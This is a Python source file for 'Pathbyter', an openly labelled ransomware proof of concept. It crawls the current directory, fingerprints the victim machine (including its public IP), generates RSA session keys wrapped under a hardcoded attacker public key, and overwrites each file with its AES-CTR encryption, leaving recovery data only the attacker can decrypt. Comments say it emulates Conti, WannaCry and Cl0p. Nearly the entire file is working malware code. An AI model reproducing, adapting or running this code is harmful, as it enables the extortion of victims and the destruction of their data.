from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
from base64 import b64encode, b64decode
from requests import get
from requests.exceptions import RequestException
from multiprocessing import Pool, TimeoutError
from os import getuid, getlogin, cpu_count, system, walk
from os.path import join, expanduser
from uuid import uuid4
from time import time
from sys import exit, stderr
import json
import platform

RESCUE_FILE1 = 'DO-NOT-DELETE.json'
RESCUE_FILE2 = 'YOUR-ONLY-CHANCE.json'
IGNORE_FILES = ['pathbyter.py', RESCUE_FILE1, RESCUE_FILE2]
# For AES CFB to set the block size of the bit stream. It may not be used depending on speed tests
ATTACKER_PUBLIC_KEY = \
"""MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAsi9vydIF72pC3xmAbUO4
vXqZa9aKSifwbEiRemDuyiw4oTrMAem5xU4DoqMSU1HavGYd4KNAKhV7pjPuKnDP
wdZUKY6wre8FEQpdXNHnZEyWKkmoJLQ6XXFH/AHcTBIFhaXQSj3ROcPqeiWXgcS2
IkL1Ir+bt34b9pqC4YdQZ9AB/nuMeqGkcdyDqSKgaXCudz/6Pa7uG7de91AYnBLu
kwnE5CjJim0ZNpuAjPlmfd4ohllnLVDydB06tvDCySi8sU+CT5JCFbHw9XYgbwNr
TkIjPhDmgafpqSPgflTyPAmjHp63mFYqL5X4Vu9lmQ+C3I34Bf7Sr46AZ0DF/1+8
GQAlmyvIb3JJlBIlaGH3SrzNZ7eUpDeTVb5CsxvsnnyHZJiS8k/5b7vCU0dVYqiA
GPZXBrkyz/XHrkRyWcdv0kTj7QA0aCoeNuoU62G2ibzD1uoAWFWRQF1KbXK/017H
PdaRhzBp0KqKJbbo2jFaw4VWzhQRPad3Xbwza3zlfcQLCFSUco3wfvoyxBzuEKG4
AdKlol5q7D8mYJ7oc2lgQtNiUvGnsRjwNdSAPUaJtMd56gZ8YfY3QVg1mhTDGd6/
n9Jk+oCKf8wDi6PrAM3It+hn5QrlIkwarRnF5hCEf3D5nbhbqJ5z1GztJaQRCrUi
RYbITkAv0IjqmRdwhauPJ9MCAwEAAQ=="""


# Simple timer class
class Runtime:
    def __init__(self):
        self.start_time = time()
    def elapsed_time(self):
        print(f'runtime: {time() - self.start_time}\n')

import platform


# Portable system class used to collect useful information.
class System:
    def __init__(self):
        self.inet_connection = self.__check_inet_connection()
        self.pub_ip = self.__get_public_ip()
        self.os = platform.system()
        self.user = getlogin()
        self.home_dir = expanduser('~')
        self.cpu = platform.processor()
        self.cores = cpu_count()
        self.machine_arch = platform.architecture()[0]
        self.exec_type = platform.architecture()[1]
        self.machine = platform.machine()

    
    def __check_inet_connection(self):
        """Cross platform method of pinging Google 
        to check for internet connectivity."""
        try:
            google_dns = '8.8.8.8'
            response = system(f'ping -c 1 {google_dns} >/dev/null')
            if response == 0:
                return True
            else:
                return False
        except:
            return False


    def __get_public_ip(self):
        """A convenient API call. If internet, 
        get the current public ip. """
        api_uri = 'https://api.ipify.org'
        if self.inet_connection == True:
            try:
                ip = get(api_uri, timeout=3)
            except RequestException:
                pass
            return ip.text
        else:
            self.pub_ip = ''


    def print_attributes(self):
        for attribute, value in self.__dict__.items():
            if value == None:
                pass
            else:
                print(f'{attribute}: {value}')


    def path_crawl(self, path=None, ignore_files=None):
        """ Recursively crawl the selected path and return the results
        in a list variable. By default path_crawl() returns a list of
        all the files in './' and its subdirectories. 
        If path == 'user', path_crawl will use os.path.expanduser(~)
        to return a list of the current user's files."""
        file_paths = []
        if path == None:
            path = './'
        elif path.tolower() == 'user':
            path = expanduser('~')  
        else:
            path = path
        if ignore_files:
            for root, dirs, files in walk(path):
                for f in files:
                    if f in ignore_files:
                        pass
                    else:
                        f_path = join(root, f)
                        file_paths.append(f_path)
        else:
            for root, dirs, files in walk(path):
                for f in files:
                    f_path = join(root, f)
                    file_paths.append(f_path)
        return file_paths
    

def load_rsa_pubkey(rsa_pubkey):
        key = b64decode(rsa_pubkey)
        rsa_key = RSA.import_key(key)

        return rsa_key


def rsa_wrap_aes(rsa_pubkey, aes_key):
    """The most nefarious ransomware developers (Conti,
    WannaCry, Cl0P) use a variation of hybrid symmetric/assymetric 
    encryption. I choose to implement RSA wrapped AES."""
    cipher_rsa = PKCS1_OAEP.new(rsa_pubkey)
    cipher_text = cipher_rsa.encrypt(aes_key)
    rsa_ct = b64encode(cipher_text).decode('utf-8')

    return rsa_ct


def aescbc_encrypt(rsa_pubkey, data_to_encrypt):
    sess_aeskey = get_random_bytes(16)
    cipher = AES.new(sess_aeskey, AES.MODE_CBC) 
    cipher_text = cipher.encrypt(pad(data_to_encrypt, AES.block_size))
    
    aes_ct = b64encode(cipher_text).decode('utf-8')
    iv = b64encode(cipher.iv).decode('utf-8')

    rsa_ct = rsa_wrap_aes(rsa_pubkey, sess_aeskey)

    return rsa_ct, aes_ct, iv


def aesctr_encrypt(encrypt_me):
    """Pathbyter uses AES CTR to encrypt the target files. CTR
    allows for block encryption , which XORs bits inn parallel,
    and from my research is the fastest AES cipher. """
    new_aeskey = get_random_bytes(16)
    rsa_ct = rsa_wrap_aes(sess_pubkey, new_aeskey)
    cipher = AES.new(new_aeskey, AES.MODE_CTR)

    aes_ct = cipher.encrypt(encrypt_me)
    nonce = b64encode(cipher.nonce).decode('utf-8')

    return rsa_ct, aes_ct, nonce


def record_victim_info(rsa_pubkey):
    """ Generate the ransomware key-value JSON database, 
    and update it with an encrypted string of information
    about the target system, along with a unique 
    victim ID#."""
    victim_id = uuid4()
    idcard = ("'id': {},\n'pub_ip': {},\n'os': {},\n'usr': {},\n'machine_arch': {},\n'exec': {},\n'timestamp': {}") \
        .format(victim_id, 
            victim_sys.pub_ip, 
            victim_sys.os, 
            victim_sys.user,
            victim_sys.machine_arch, 
            victim_sys.exec_type, 
            time()).encode()
    
    id_ctrsa, id_ctaes, id_iv = aescbc_encrypt(rsa_pubkey, idcard)
    json_string = {'id': {'idstring': id_ctrsa, 'aescbc_key': id_ctaes, 'aescbc_iv': id_iv}}
    with open(RESCUE_FILE1, 'w') as f:
        json.dump(json_string, f)    


def generate_session_keys(rsa_pubkey):
    """This function emulates the tactics used by the authors
    of ransomware like Conti, WannaCry, Cl0p, etc. It takes one 
    argument, which is the attacker's hardcoded RSA key.

    First: The function generates a new RSA 2048-bit session key pair 
    in DER (binary) format. 
    
    Second: it encrypts the RSA private key with a new AES 128-bit key 
    while still in memory and in function scope. The intention is to 
    prevent the unencrypted RSA session private key from being written to 
    disk, and potentially be recoverable by a skilled defender even if
    'deleted'.
    
    Third: it wraps the previously generated AES key with RSA using the 
    attacker's hardcoded public key. 
    
    Fourth: it dumps the AES encrypted RSA session private key, the RSA encrypted 
    AES-CBC key used to encrypt the session private key, and the initialization
    vector required to decrypt AES-CBC to the JSON database. 
    
    Fith (and finally): it returns the RSA session public key as a variable, ready to 
    encrypt new AES keys, one for each file the ransomware encrypts."""
    keys = RSA.generate(2048)
    sess_privkey = keys.export_key('DER')
    sess_pubkey = keys.publickey().export_key('DER')
    enc_rsa_privkey, enc_aes_key, iv = aescbc_encrypt(rsa_pubkey, sess_privkey)
    db_stub = {'stub': {'rsa_privkey': enc_rsa_privkey, 
                            'aescbc_key': enc_aes_key,
                            'aescbc_iv': iv}}
    with open(RESCUE_FILE1, 'r+') as f:
        database = json.load(f)

        database.update(db_stub)
        json.dump(database, f)

    rsa_key = RSA.import_key(sess_pubkey)
    return rsa_key


def exec_ransomware_attack(file_path):
    """Yes, I am a criminal. My crime is that of curiosty. 
    In main we have generated a multiprocessing Pool class
    instance, which takes one argument, the number of processors
    used to populate the pool with.
    The pool.map(target_function, iterable) takes two arguments,
    the target function (exec_ransomware_attack) and an 
    iterable (the list of target files). Pathbyter uses the System 
    class to populate the target files list, and determine the number 
    of cores. Then it divides the iterable equally among the number 
    of processes of target files equally among the number of 
    processors the victim system has. 
    
    >> For all the files in target files: AESCTR Encrypt file 
        and dump all the necessary things for decryption into
        the JSON database.""" 
    with open(file_path, 'rb') as f:
        data = f.read()     
        rsa_ct, aes_ct, nonce = aesctr_encrypt(data)
        json_string = {'file_path': file_path, 'key': rsa_ct, 'nonce':nonce, }
        with open(RESCUE_FILE2, 'a') as f:
            json.dump(json_string, f)
        print(f'File {file_path} encrypted in process {getuid()}') 
    with open(file_path, 'wb') as f:
        f.write(aes_ct)
    return 0

    
if __name__=='__main__':
    try:
        runtime = Runtime()
        victim_sys = System()
        target_files = victim_sys.path_crawl(path=None, ignore_files=IGNORE_FILES)
        atkr_pubkey = load_rsa_pubkey(ATTACKER_PUBLIC_KEY)
        record_victim_info(atkr_pubkey)
        sess_pubkey = generate_session_keys(atkr_pubkey)
        with Pool(victim_sys.cores - 1) as pool:
            pool.map(exec_ransomware_attack, target_files)
        runtime.elapsed_time()
        sys.exit()
    except Exception as e:
        stderr.write(e)
        pass
